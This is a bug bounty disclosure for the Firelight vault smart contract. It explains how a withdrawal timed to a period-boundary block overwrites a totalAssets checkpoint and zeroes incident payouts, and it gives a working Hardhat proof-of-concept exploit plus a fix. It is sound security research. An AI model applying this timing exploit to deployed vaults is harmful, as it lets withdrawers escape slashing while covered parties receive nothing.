# 88636 sc high period boundary withdrawal overwrites totalassets exposure checkpoint payout cap collapses to zero and the withdrawer escapes the slash

**Submitted on Aug 14th 2026 at 09:47:33 UTC by @scoot69 for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88636
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

`FirelightVault.payout()` caps an incident payout to the vault's total assets at the capture period start, using a checkpoint that a withdrawal mined in the exact period-boundary block can overwrite with the post-withdrawal value. A withdrawer who times a withdrawal to the boundary block collapses that exposure cap to zero: the incident payout pays nothing, the beneficiary receives nothing, and the withdrawer's bucket stays fully payable, so after the payout window they claim the full amount back and escape the slash entirely. In production any incident whose capture timestamp falls on a period boundary where a withdrawal was mined pays zero to the covered party, and the withdrawer walks away with funds that should have been slashed.

## Vulnerability Details

Every deposit and withdraw flow ends in `_logTrace`, which checkpoints `totalAssets` keyed by block timestamp:

```solidity
// contracts/core/FirelightVault.sol:1044-1056
function _logTrace(address owner, uint256 balance, uint256 _totalSupply, uint256 _totalAssets, bool isLogAssets) private {
    uint48 ts = Time.timestamp();                        // key = block timestamp
    _traceBalanceOf[owner].push(ts, balance);
    _traceTotalSupply.push(ts, _totalSupply);
    if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);   // line 1055
}
```

`Checkpoints.Trace256.push` replaces the stored value when the key equals the last checkpoint key, and `upperLookupRecent` returns the most recent checkpoint with key <= the lookup key:

```solidity
// contracts/core/lib/Checkpoints.sol:198-214
function push(Trace256 storage self, uint48 key, uint256 value) internal returns (uint256, uint256) {
    ...
    if (exists && key == lastKey) {
        self._values[len - 1] = value;   // lines 207-208 — same-key OVERWRITE
    } else {
        self._trace.push(key, uint208(len));
        self._values.push(value);
    }
}
```

`payout()` derives its exposure cap from this trace and separately treats capture-period withdrawals as payable:

```solidity
// contracts/core/FirelightVault.sol:892-927
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);   // line 911 — the cap
uint256 capturePeriodWithdrawals = withdrawAssets[capturePeriod + 1]; // line 916
uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals; // line 926
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount)); // line 927
```

`totalAssetsAt` is a straight `upperLookupRecent` (`FirelightVault.sol:456-458`).

**The bug:** when a withdrawal's block timestamp equals the period start (`capturePeriodStart`), `_logTrace` writes a checkpoint with key exactly `capturePeriodStart` and value equal to the post-withdrawal `totalAssets` (0 if the withdrawer takes everything). If a checkpoint at that key already exists, `push` overwrites it (`Checkpoints.sol:207-208`); if not, the new entry is still the most recent checkpoint with key <= `periodStart`, so `upperLookupRecent` returns the post-withdrawal value anyway. Either way `totalAssetsAt(capturePeriodStart)` collapses from the pre-boundary exposure to 0. Meanwhile lines 916-926 still count `withdrawAssets[capturePeriod + 1]` (the full withdrawal) as payable, and the payout code itself documents the contradiction: it intends capture-period withdrawals to "remain payable" (lines 914-915) while its cap lookup is corrupted by the very transaction that created that bucket. After `paidAmount = 0`, `withdrawAssets[capturePeriod + 1]` is never reduced (the decrement at line 954 runs only inside `if (paidAmount > 0)`), so `claimWithdraw(period)` pays out the full amount once `currentPeriod() > capturePeriod + 1`.

Recommended fix: read the exposure from just before the period start — `totalAssetsAt(capturePeriodStart - 1)` — which returns the most recent checkpoint strictly before the boundary and is immune to any same-timestamp boundary-block write. Alternatively store a dedicated `exposureAtPeriodStart[period]` mapping written at rollover, or prevent user flows from writing checkpoints at exact period-start keys.

## Impact Details

**Severity: Medium**, under the Griefing impact (damage to users or the protocol, no profit motive required). The payout exposure cap — the mechanism that guarantees an incident captured in a period is paid from the assets exposed during that period — can be reduced to zero by one withdrawal mined in the first block of the period. The payout then pays nothing while the withdrawal bucket stays fully payable, so the loss is real, direct, and quantified.

* **Scenario (from PoC):** the vault holds 200 units (6-decimal asset). Alice withdraws all 200 in the exact period-1-start block. An incident is captured for period 1 and assessed at 200. `payout(receiver, 200, period1Start)` returns 0 — the incident receives nothing — while `withdrawAssets[2] = 200` remains payable. Two periods later Alice claims the full 200.
* **Who loses what:** cover beneficiaries and incident payout receivers lose the entire assessed amount (200 units in the PoC; the full vault exposure in general). The exposure-cap protection is bypassed, the withdrawer escapes any reduction of their payout, and the loss is transferred to the incident side of the protocol.
* **Generality:** the corruption is not limited to full collapse. Any deposit or withdrawal mined in the first block of a period rewrites the period-start checkpoint (deposits inflate it, withdrawals deflate it), so organic boundary-block activity also mis-states the cap; the adversarial case just makes the collapse complete.
* **Exploitation requirement:** the withdrawal must be mined with `block.timestamp` equal to the period start. This is standard transaction timing (submit in the first block of a period); no privileged role, no external state, and no out-of-scope contract is involved.

## References

* Repository: <https://github.com/immunefi-team/audit-comp-firelight> — branch `v1_audit_ready`, commit `42f9ea5e43d88b35197b901acc2a8c24b314fa62`
* `contracts/core/FirelightVault.sol` — `withdraw()` 755-777, `_logTrace()` 1044-1056, `payout()` 892-966, `claimWithdraw()` 788-811, `totalAssetsAt()` 456-458, `_isPeriodInPayoutWindow()` 1130-1132
* `contracts/core/lib/Checkpoints.sol` — `Trace256.push()` 198-214 (overwrite at 207-208), `Trace256.upperLookupRecent()` 221-224
* PoC: `test/audit-exploratory/F2-boundary-overwrite.js` (embedded in the Proof of Concept section)

## Link to Proof of Concept

<https://gist.github.com/piegunn/b86b4e121fef208093817d0876810af8>

## Proof of Concept

The PoC is a standalone Hardhat test file. No existing contract, fixture, or configuration file is modified; only one new file is created. Both tests pass on a clean clone of the audited commit.

{% stepper %}
{% step %}

## Clone the in-scope repository, check out the audited revision, and install pinned dependencies

```bash
git clone https://github.com/immunefi-team/audit-comp-firelight.git
cd audit-comp-firelight
git checkout v1_audit_ready   # commit 42f9ea5e43d88b35197b901acc2a8c24b314fa62
npm ci
```

{% endstep %}

{% step %}

## Create the PoC test file `test/audit-exploratory/F2-boundary-overwrite.js`

Run `mkdir -p test/audit-exploratory` first — the clean clone has no such directory.

Create the file with exactly this content:

```javascript
// PoC: Withdrawal at an exact period boundary overwrites the period-start
// totalAssets checkpoint, collapsing the incident payout exposure cap to the
// post-withdrawal balance — even though the withdrawal bucket remains payable.
//
// Vulnerable code (in scope):
//   FirelightVault._logTrace      -> _traceTotalAssets.push(Time.timestamp(), ...)
//   Checkpoints.Trace256.push     -> overwrites value when key == last checkpoint key
//   FirelightVault.payout         -> assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart)
//
// When a withdrawal executes in a block whose timestamp == currentPeriodStart()
// (any deposit/withdraw in the first block of a period), the checkpoint for
// that exact key is REPLACED by the post-withdrawal total. payout() for an
// incident captured anywhere in that period then caps by the LOWERED value.
//
// Attack economics: Alice withdraws everything in the exact boundary block.
// Incident occurs mid-period. Approver calls vault.payout — assetsAtCapturePeriod
// is 0, paidAmount = 0. Alice's withdrawal bucket (withdrawAssets[period+1]) is
// explicitly counted as payable by the payout code ("withdrawals requested during
// the capture period ... remain payable") — but the overwritten exposure cap
// zeroes the result. After the payout window, Alice claims 100% of her
// withdrawal, escaping the slash entirely. Cover beneficiaries receive nothing.

const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers')
const { deployVault } = require('../setup/fixtures.js')
const { expect } = require('chai')

describe('F2 - Period-boundary checkpoint overwrite collapses payout exposure cap', function () {
  async function setup() {
    // 6-decimal mock asset, 50k deposit limit, 1-week periods (repo defaults)
    const ctx = await loadFixture(deployVault.bind(null, {}))
    const alice = ctx.users[0]
    const amount = 200n * 10n ** 6n

    await ctx.utils.mintAndApprove(amount, alice)
    await ctx.firelight_vault.connect(alice).deposit(amount, alice.address)
    return { ...ctx, alice, amount }
  }

  it('payout returns 0 after a boundary withdrawal; withdrawer claims everything later', async function () {
    const { firelight_vault, token_contract, alice, amount, payout_signer, payout_receiver, config } =
      await loadFixture(setup)

    // Identical semantics to VaultWithdrawalHunt Foundry PoC.
    // 1) Move to the exact start of period 1.
    const periodDuration = BigInt(config.period_configuration_duration)
    const startTs = await firelight_vault.currentPeriodStart()
    const boundaryTs = BigInt(startTs) + periodDuration
    await time.setNextBlockTimestamp(boundaryTs)

    // 2) Alice withdraws ALL in the exact boundary block (timestamp == period start).
    //    This replaces the (boundaryTs, 200) checkpoint with (boundaryTs, 0).
    await firelight_vault.connect(alice).withdraw(amount, alice.address, alice.address)

    expect(await firelight_vault.currentPeriod()).to.equal(1n)
    expect(await firelight_vault.currentPeriodStart()).to.equal(boundaryTs)
    expect(await firelight_vault.totalAssetsAt(boundaryTs)).to.equal(0n) // checkpoint overwritten
    expect(await firelight_vault.withdrawAssets(2n)).to.equal(amount) // vault's own payable withdrawal bucket
    expect(await firelight_vault.pendingWithdrawAssets()).to.equal(amount)

    // 3) Incident is later captured for period 1 (captureTimestamp = boundaryTs).
    //    Approver calls payout: activePayable = 0 + withdrawAssets[2] = 200,
    //    but exposures cap = totalAssetsAt(boundaryTs) = 0 => paidAmount = 0.
    const paid = await firelight_vault.connect(payout_signer).payout.staticCall(
      payout_receiver.address, amount, boundaryTs
    )
    expect(paid).to.equal(0n)

    await firelight_vault.connect(payout_signer).payout(payout_receiver.address, amount, boundaryTs)
    expect(await token_contract.balanceOf(payout_receiver.address)).to.equal(0n)

    // 4) After the payout window (currentPeriod > capturePeriod + 1), Alice claims EVERYTHING.
    //    boundaryTs = start of period 1 (capture/start), +2 periods = start of period 3.
    const waitTs = boundaryTs + 2n * periodDuration
    await time.increaseTo(waitTs)
    expect(await firelight_vault.currentPeriod()).to.equal(3n)
    await expect(firelight_vault.connect(alice).claimWithdraw(2n))
      .to.emit(firelight_vault, 'CompleteWithdraw')
      .withArgs(alice.address, amount, 2n)

    expect(await token_contract.balanceOf(alice.address)).to.equal(amount)
    expect(await firelight_vault.pendingWithdrawAssets()).to.equal(0n)
  })

  it('control: identical flow, but no operation in the boundary block', async function () {
    const { firelight_vault, amount, payout_signer, payout_receiver } = await loadFixture(setup)

    // Reproduce the F2 flow but with NO deposit/withdrawal mined in the exact
    // boundary block; the payout executes at boundaryTs + 1. The previous
    // period-start checkpoint stays intact, so totalAssetsAt(captureStart)
    // still reports the deposited amount and the payout pays out normally.
    const periodDuration = 604800n
    const startTs = await firelight_vault.currentPeriodStart()
    const boundaryTs = BigInt(startTs) + periodDuration
    const postBoundary = boundaryTs + 1n // one second later — no overwrite

    await time.setNextBlockTimestamp(postBoundary)

    // Capture at boundaryTs — still inside the payout window since we are in
    // the FIRST second of the boundary period (equal to the capturePeriod).
    const tx = await firelight_vault.connect(payout_signer).payout(payout_receiver.address, amount, boundaryTs)
    await expect(tx)
      .to.emit(firelight_vault, 'PayoutExecuted')
      .withArgs(payout_receiver.address, amount, amount, boundaryTs)
  })
})
```

{% endstep %}

{% step %}

## Verify the revision and run the PoC

```bash
git rev-parse HEAD   # expect 42f9ea5e43d88b35197b901acc2a8c24b314fa62
npx hardhat test test/audit-exploratory/F2-boundary-overwrite.js
```

**Expected result — 2 passing:**

```
  F2 - Period-boundary checkpoint overwrite collapses payout exposure cap
    ✔ payout returns 0 after a boundary withdrawal; withdrawer claims everything later
    ✔ control: identical flow, but no operation in the boundary block

  2 passing
```

{% endstep %}
{% endstepper %}

### What each test proves

* **Test 1** — mines Alice's full withdrawal in the exact period-start block (`time.setNextBlockTimestamp(boundaryTs)`), asserts `totalAssetsAt(boundaryTs) == 0`, `withdrawAssets(2) == 200`, `paidAmount == 0`, receiver balance `0`, and finally `claimWithdraw(2)` transferring all 200 to Alice after the payout window. This is the exploit end-to-end against the production vault.
* **Test 2 (control)** — the identical capture (`captureTimestamp = boundaryTs`) but with no deposit/withdrawal mined in the exact boundary block; the payout executes at `boundaryTs + 1` and asserts `PayoutExecuted(receiver, amount, amount, boundaryTs)`, i.e. the full 200 is paid. This isolates the boundary-block checkpoint write as the sole cause of the collapse in test 1.

The test runs locally against the in-scope contracts (no mainnet/testnet interaction, no forks of external systems).
